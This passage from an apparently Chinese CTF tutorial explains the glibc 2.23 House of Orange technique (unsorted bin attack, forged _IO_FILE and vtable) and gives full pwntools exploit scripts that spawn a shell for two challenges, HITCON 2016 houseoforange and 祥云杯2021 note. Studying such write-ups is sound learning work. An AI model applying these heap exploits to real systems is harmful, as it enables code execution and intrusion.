MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            _int_free (av, old_top, 1);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>画个简单的流程图来总结一下</p>
<p><img src="http://static.zybuluo.com/hgggg/o5w1swm10mrscnnqtes1l2bo/10.png" alt="10.png-53.6kB"><br>
<strong>综上所述 ， 当我们控制top chunk的大小为unsorted bin的大小时，就可以unsorted bin attact</strong></p>
<h2 id="malloc-printerr-源码分析"><a class="header-anchor" href="#malloc-printerr-源码分析">¶</a>malloc_printerr 源码分析</h2>
<p>malloc_printerr是malloc中用于提示错误的函数，该函数最终会调用__libc_message</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Avoid using this arena in future.  We do not attempt to synchronize this</span></span><br><span class="line"><span class="comment">     with anything else because we minimally want to ensure that __libc_message</span></span><br><span class="line"><span class="comment">     gets its resources safely without stumbling on the current corruption.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进__libc_message,最终会调用abort()来切断进程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_abort)</span><br><span class="line">  &#123;</span><br><span class="line">    BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Kill the application.  */</span></span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进,abrot里面会调用fflush</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (stage == 1)</span><br><span class="line">  &#123;</span><br><span class="line">    ++stage;</span><br><span class="line">    fflush (NULL);</span><br><span class="line">  &#125;c</span><br></pre></td></tr></table></figure>
<p>可以得到一条调用链<br>
_IO_fflush -&gt; _IO_flush_all -&gt; _IO_flush_all_lockp</p>
<p>_IO_flush_all_lockp从_IO_list_all作为链表头进行遍历，以当前节点作为 _IO_OVERFLOW的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>_IO_OVERFLOW的定义如下,它会去调用__overflow函数，而__overflow函数又和_IO_FILE里的函数相关</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>
<p>如果我们最终可以伪造IO_FILE结构，就可以达到劫持程序流的目的</p>
<p>_IO_FILE结构如下，struct _IO_FILE *_chain是一个用于指向_IO_FILE中下一个成员的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>_IO_FILE作为一个单链表结构，_IO_list_all作为表头，利用之前得到的unsorted bin<br>
则可以劫持_IO_list_all，将_IO_list_all的值伪造为main_arena+88。此时main_arena+88<br>
作为_IO_FILE的头，但是由于main_arena+88是不可控的，所以不能在此处伪造，但我们可以通过<br>
struct _IO_FILE <em>_chain将其链接到一个可控的地方来伪造我们的_IO_FILE。当调用_IO_FILE<br>
时，由于mian_arena+88的数据不符合，就会通过</em>_chain去向后搜索，当搜索到我们伪造好的<br>
_IO_FILE结构体时就会调用其虚表里的函数。</p>
<p>而如果将main_arena+88处看作一个_IO_FILE结构体，那么struct _IO_FILE *_chain<br>
指针的位置为main_arena+88+0x68，该位置刚好是0x60大小的small bin第一个chunk的地址。<br>
如果将伪造好的_IO_FILE结构体布置在那里，那么当程序执行_IO_OVERFLOW时，我们就可以劫持<br>
程序流</p>
<p>那么如何得到一个大小为0x60的small bin呢，在构造unsorted bin的时候我们可以将其size<br>
覆盖为0x60，这样在发生unsorted bin 遍历时就会将这个unsorted bin 链入到small bin中，代<br>
码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
<pre><code>在伪造_IO_FILE结构时需要注意一下几点
1.fp-&gt;mode = 0
2._IO_write_ptr &lt; _IO_write_base
3._IO_read_ptr = 0x60 (small bin [4])
4._IO_read_base = _IO_list_all - 0x10 (unsorted bin bk)
</code></pre>
<h2 id="列题"><a class="header-anchor" href="#列题">¶</a>列题</h2>
<h3 id="hitcon-2016-houseoforange"><a class="header-anchor" href="#hitcon-2016-houseoforange">¶</a>hitcon_2016_houseoforange</h3>
<h4 id="IDA分析"><a class="header-anchor" href="#IDA分析">¶</a>IDA分析</h4>
<p>build  除了限制了申请次数为3外没什么特别的<br>
<img src="http://static.zybuluo.com/hgggg/1rppiar2k3d5r9q6vdluva12/11.png" alt="11.png-77.8kB"></p>
<p>漏洞在update上 可以造成堆溢出，得到unsorted bin<br>
<img src="http://static.zybuluo.com/hgggg/0hej1whkm528phy92uxta6qc/12.png" alt="12.png-66.3kB"></p>
<h4 id="Step1-修改top-chunk-size"><a class="header-anchor" href="#Step1-修改top-chunk-size">¶</a>Step1 修改top chunk size</h4>
<p><img src="http://static.zybuluo.com/hgggg/ji99l97thw1lo8txj2w6ft3z/13.png" alt="13.png-90.3kB"></p>
<p>可以看到top chunk 的size为0x21f81,<br>
而经过IDA分析我们最大可以申请大小为0x1000大小的堆块,<br>
可以利用堆溢出来修改size位为0xf81,构造如下payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<h4 id="Step2-unsorted-bin-attack-泄露地址"><a class="header-anchor" href="#Step2-unsorted-bin-attack-泄露地址">¶</a>Step2 unsorted bin attack 泄露地址</h4>
<p>接下来申请一个大于top chunk的chunk的到unsorted bin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/bgduyroukjb5oux25dfmyqvl/14.png" alt="14.png-64.1kB"><br>
可看到我们的到了一个unsorted bin并且其fd 和 bk指针均指向main_arena_88的位置<br>
接下来就是的到unsorted bin 申请chunk 来 libc_base 和 heap_addr 了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name of house : &#x27;</span>)</span><br><span class="line">main_arena_88 = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = main_arena_88 - <span class="number">0x3c5163</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露堆地址</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0xE0</span></span><br></pre></td></tr></table></figure>
<h4 id="Step3-伪造-IO-FILE结构体"><a class="header-anchor" href="#Step3-伪造-IO-FILE结构体">¶</a>Step3 伪造_IO_FILE结构体</h4>
<p><img src="http://static.zybuluo.com/hgggg/8v00ux1tq8602vb38j6t6ju0/15.png" alt="15.png-91.7kB"><br>
<img src="http://static.zybuluo.com/hgggg/m21uqe95v4smhqlw49ggw41g/16.png" alt="16.png-69.2kB"></p>
<p>我们需要将_IO_FIlE按照前面总结的方式伪造，<br>
当触发malloc时，glibc会整理unsorted bin，把对应size的chunk放入smallbin里面<br>
由于我们申请的chunk不和法，会触发malloc_printerr ，随后_IO_flush_all_lockp会从_IO_list_all指向的FILE结构开始查找，找到合适_IO_FILE作为_IO_OVERFLOW的参数，执行vtable里面的函数，把IO_FILE结构体本身作为参数<br>
这时我们只要将__overflow覆盖成system，并在fake_IO_FILE中写入/bin/sh做为参数就能getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#_IO_read_ptr = 0x60 (small bin [4])</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(<span class="number">0</span>) </span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>)<span class="comment">#vtable指针,同时，也作为fake_vtable的__dummy 这里的0x5E8=0x510+0xC0+0x18</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span> <span class="comment">#__dummy2、__finish</span></span><br><span class="line">fake_file += p64(system_addr)<span class="comment">#覆盖__overflow</span></span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment">#触发malloc</span></span><br></pre></td></tr></table></figure>
<p>下面是触发malloc后_IO_FILE的情况<br>
<img src="http://static.zybuluo.com/hgggg/ml2vafj9lvudw6idwgn4yxj8/17.png" alt="17.png-161.9kB"><br>
<img src="http://static.zybuluo.com/hgggg/dbljk3vs6nsagkwu9xo0jnne/18.png" alt="18.png-99.2kB"><br>
<img src="http://static.zybuluo.com/hgggg/q3w0yq81kitpr4og8h94bmpm/19.png" alt="19.png-56kB"><br>
成功get shell</p>
<h4 id="完整exp"><a class="header-anchor" href="#完整exp">¶</a>完整exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,25967)</span></span><br><span class="line">p = process(<span class="string">&#x27;/home/hgg/Desktop/houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;/home/hgg/Desktop/houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;199&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;120&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf81</span>)</span><br><span class="line">update(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">main_arena_88 = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = main_arena_88 - <span class="number">0x3c5163</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">update(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">update(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="祥云杯2021-note"><a class="header-anchor" href="#祥云杯2021-note">¶</a>祥云杯2021_note</h3>
<h4 id="IDA分析-v2"><a class="header-anchor" href="#IDA分析-v2">¶</a>IDA分析</h4>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/utb61irhn7pfb8divn1r5gcm/20.png" alt="20.png-47kB"></p>
<p>say<br>
<img src="http://static.zybuluo.com/hgggg/myib49627xjbzmxixn6uh05q/21.png" alt="21.png-27.8kB"></p>
<p>show<br>
<img src="http://static.zybuluo.com/hgggg/6vla2w4fpv4bnyi7a9oekzn9/22.png" alt="22.png-19.7kB"></p>
<h4 id="Step1泄露堆地址"><a class="header-anchor" href="#Step1泄露堆地址">¶</a>Step1泄露堆地址</h4>
<p><s>这个不难，有手就行</s>，直接上代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<h4 id="Step2-house-of-orange得到unsorted-bin"><a class="header-anchor" href="#Step2-house-of-orange得到unsorted-bin">¶</a>Step2 house of orange得到unsorted bin</h4>
<p>前面我们通过堆溢出来修改top chunk 的size ，但是这道题不行<br>
这道题需要用，scanf的格式化字符串漏洞来修改数据<br>
一般来说scanf(“%d”,&amp;a),%d是格式化字符串，&amp;a是参数，scanf的前5个参数都是由寄存器储存的，从第6个开始储存在栈上<br>
所以我们构造格式化字符串 %7$s.ljust(8,‘\x00’) (原因是栈上的第一个参数会放置我们的格式化字符串，第二个参数则会去作为我们任意地址写的参数)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">top_chunk = heap_addr + <span class="number">0x40</span></span><br><span class="line">top_size = top_chunk + <span class="number">8</span></span><br><span class="line">say(<span class="string">b&#x27;%7$daaaa&#x27;</span>+p64(top_size),<span class="built_in">str</span>(<span class="number">0xfb1</span>))</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/70yvps4st5g58xgbznkad2rl/23.png" alt="23.png-19.5kB"><br>
可以看到top chunk 已经被成了伪造0xfb1<br>
接下来只要我们连续申请chunk就能得到unsorted bin 来leak libc了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_addr - <span class="number">0x3C4C61</span></span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/2lsotbhov1sfzdv9d462p2es/24.png" alt="24.png-66kB"></p>
<h4 id="Step3-malloc-hook-劫持为-realloc-，realloc-hook-劫持为-onegadget-来-get-shell"><a class="header-anchor" href="#Step3-malloc-hook-劫持为-realloc-，realloc-hook-劫持为-onegadget-来-get-shell">¶</a>Step3  malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget 来 get shell</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one = libc_base + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">say(<span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(malloc_hook-<span class="number">8</span>),p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="反思"><a class="header-anchor" href="#反思">¶</a>反思</h2>
<p>上述的利用方式仅仅只是对glibc2.23及以下版本有效<br>
在glibc2.24 - 2.26 之间增加了对vtable合法性的检查，即虚表的地址必须在__start__libc_IO_vatbales 和 __stop__libc_IO_vtables之间<br>
bypass思路：__overflow-&gt;_IO_strn_jump-&gt;_IO_str_finish(_IO_FILE+0x38 = /bin/sh , _IO_FIE+0Xe8 = system)</p>
<pre><code>1.fp-&gt;mode = 0
2._IO_write_ptr &lt; _IO_write_base
3._IO_read_ptr = 0x60 (small bin [4])
4._IO_read_base = _IO_list_all - 0x10 (unsorted bin bk)
5.vtable = _IO_str_jump - 8 
6.byte(fp-&gt;flags) = 0
7.fp -&gt; _IO_buf_base = /bin/sh
8.fp -&gt; 0xe8 = system
</code></pre>
<p>在glibc2.27之后则是去掉了abort()中的fflush(NULL)使得该漏洞无法得到利用</p>
<p>P.S. 在伪造top chunk时要注意合法性</p>
